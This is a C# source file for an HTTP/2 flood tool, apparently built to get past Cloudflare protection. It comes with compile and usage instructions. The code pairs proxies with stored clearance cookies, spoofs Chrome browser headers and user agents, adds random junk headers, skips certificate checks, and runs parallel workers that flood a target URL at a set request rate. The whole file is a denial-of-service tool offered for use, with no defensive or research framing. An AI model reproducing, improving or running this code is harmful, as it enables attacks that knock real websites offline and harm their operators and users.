// CF_Http2Flood.cs
// Compile: dotnet new console -n CF_Http2Flood -f net8.0 && cd CF_Http2Flood
// Replace Program.cs with this code, then `dotnet build -c Release`
// Usage: dotnet run -- <target> <floodDuration> <rps> <proxyFile> <cookieFile> [--threads 10]

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class CF_Http2Flood
{
    static readonly Random _rand = new Random();
    static string _targetUrl;
    static int _floodDurationSec;
    static int _rps;                // requests per second per connection
    static string _proxyFile;
    static string _cookieFile;
    static int _threads = 10;       // number of parallel flood tasks

    static async Task Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: CF_Http2Flood <target> <floodDuration> <rps> <proxyFile> <cookieFile> [--threads N]");
            Console.WriteLine("Example: dotnet run -- https://example.com 60 50 proxies.txt cookies.txt --threads 20");
            return;
        }

        _targetUrl = args[0];
        _floodDurationSec = int.Parse(args[1]);
        _rps = int.Parse(args[2]);
        _proxyFile = args[3];
        _cookieFile = args[4];

        for (int i = 5; i < args.Length; i++)
        {
            if (args[i] == "--threads" && i + 1 < args.Length)
                _threads = int.Parse(args[++i]);
        }

        // Load proxies
        var proxies = File.ReadAllLines(_proxyFile)
            .Where(l => !string.IsNullOrWhiteSpace(l) && !l.StartsWith("#"))
            .Select(l => l.Trim())
            .ToArray();

        // Load cookies (each line: proxy,cookie)
        var cookieLines = File.ReadAllLines(_cookieFile)
            .Where(l => !string.IsNullOrWhiteSpace(l) && !l.StartsWith("#"))
            .Select(l => l.Trim().Split(','))
            .ToDictionary(parts => parts[0], parts => parts.Length > 1 ? parts[1] : null);

        var proxyCookies = proxies
            .Where(p => cookieLines.ContainsKey(p) && !string.IsNullOrEmpty(cookieLines[p]))
            .Select(p => new { Proxy = p, Cookie = cookieLines[p] })
            .ToList();

        if (proxyCookies.Count == 0)
        {
            Console.WriteLine("[!] No valid proxy+cookie pairs found. Check your files.");
            return;
        }

        Console.WriteLine($"\n[🔥] CF HTTP/2 Flood | Target: {_targetUrl}");
        Console.WriteLine($"     Duration: {_floodDurationSec}s | RPS: {_rps} | Threads: {_threads}");
        Console.WriteLine($"     Loaded {proxyCookies.Count} proxy+cookie pairs.");

        var cts = new CancellationTokenSource();
        var tasks = new List<Task>();
        var counter = new ConcurrentDictionary<int, long>();

        // Start flood tasks (each task uses one proxy+cookie)
        for (int i = 0; i < Math.Min(_threads, proxyCookies.Count); i++)
        {
            int idx = i;
            var pc = proxyCookies[idx % proxyCookies.Count];
            tasks.Add(Task.Run(() => FloodWorker(idx, pc.Proxy, pc.Cookie, cts.Token, counter)));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counter)
                {
                    if (kv.Value > 0)
                        Console.WriteLine($"[Worker {kv.Key}] RPS: {kv.Value}");
                    counter[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(_floodDurationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[⏹️] Flood finished.");
    }

    static async Task FloodWorker(int id, string proxy, string cookie, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        var uri = new Uri(_targetUrl);
        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromSeconds(30),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(10),
            MaxConnectionsPerServer = 1000,
            EnableMultipleHttp2Connections = true,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        // Set proxy if provided
        if (!string.IsNullOrEmpty(proxy))
        {
            var proxyParts = proxy.Split(':');
            if (proxyParts.Length == 2)
            {
                handler.Proxy = new WebProxy(proxyParts[0], int.Parse(proxyParts[1]));
                handler.UseProxy = true;
            }
        }

        using var client = new HttpClient(handler);
        client.DefaultRequestHeaders.Clear();
        client.DefaultRequestHeaders.Add("User-Agent", RandomUserAgent());
        client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br, zstd");
        client.DefaultRequestHeaders.Add("Accept-Language", RandomLanguage());
        client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
        client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
        client.DefaultRequestHeaders.Add("Te", "trailers");
        client.DefaultRequestHeaders.Add("Cookie", cookie);
        client.DefaultRequestHeaders.Add("Priority", "u=0, i");

        // Random Chrome version for sec-ch-ua
        var chromeVer = _rand.Next(120, 128);
        client.DefaultRequestHeaders.Add("sec-ch-ua", $"\"Chromium\";v=\"{chromeVer}\", \"Not)A;Brand\";v=\"8\", \"Chrome\";v=\"{chromeVer}\"");
        client.DefaultRequestHeaders.Add("sec-ch-ua-mobile", "?0");
        client.DefaultRequestHeaders.Add("sec-ch-ua-platform", "Windows");

        // Add random dynamic headers (like original)
        if (_rand.NextDouble() < 0.3)
            client.DefaultRequestHeaders.Add($"purpure-secretf-id", $"formula-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.5)
            client.DefaultRequestHeaders.Add($"sec-stake-fommunity", "bet-clc");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"{RandomString(1,2)}-SElF-DYNAMIC-{RandomString(1,2)}", $"zero-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"stringclick-bad-{RandomString(1,2)}", $"router-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"root-user{RandomString(1,2)}", $"root-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"Java-x-seft{RandomString(1,2)}", $"zero-{RandomString(1,2)}");
        if (_rand.NextDouble() < 0.6)
            client.DefaultRequestHeaders.Add($"HTTP-requests-with-unusual-HTTP-headers-or-URI-path-{RandomString(1,2)}", $"router-{RandomString(1,2)}");

        // Build request URI (random query param to avoid cache)
        string baseUri = uri.ToString();
        string randomQuery = (baseUri.Contains('?') ? "&" : "?") + $"_={RandomString(8)}";
        string requestUri = baseUri + randomQuery;

        int intervalMs = 1000 / _rps;
        var sw = Stopwatch.StartNew();

        while (!ct.IsCancellationRequested && sw.Elapsed.TotalSeconds < _floodDurationSec)
        {
            // Send batch of requests (can be 1 per interval or multiple)
            int batchSize = _rand.Next(1, 4); // mimic original's loop of rps per interval
            var tasks = new Task[batchSize];
            for (int i = 0; i < batchSize; i++)
            {
                tasks[i] = SendRequestAsync(client, requestUri, ct);
            }
            await Task.WhenAll(tasks);
            counter.AddOrUpdate(id, batchSize, (_, old) => old + batchSize);

            await Task.Delay(intervalMs, ct);
        }
    }

    static async Task SendRequestAsync(HttpClient client, string uri, CancellationToken ct)
    {
        try
        {
            using var response = await client.GetAsync(uri, HttpCompletionOption.ResponseHeadersRead, ct);
            // Immediately discard body to free resources
            await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
        }
        catch (Exception)
        {
            // Ignore errors
        }
    }

    static string RandomUserAgent()
    {
        var uas = new[]
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Mobile Safari/537.36"
        };
        return uas[_rand.Next(uas.Length)];
    }

    static string RandomLanguage()
    {
        var langs = new[] { "en-US,en;q=0.9", "fr-FR,fr;q=0.8,en;q=0.7", "de-DE,de;q=0.9", "es-ES,es;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9" };
        return langs[_rand.Next(langs.Length)];
    }

    static string RandomString(int minLen, int maxLen)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        int len = _rand.Next(minLen, maxLen + 1);
        return new string(Enumerable.Repeat(chars, len).Select(s => s[_rand.Next(s.Length)]).ToArray());
    }

    static string RandomString(int len) => RandomString(len, len);
}
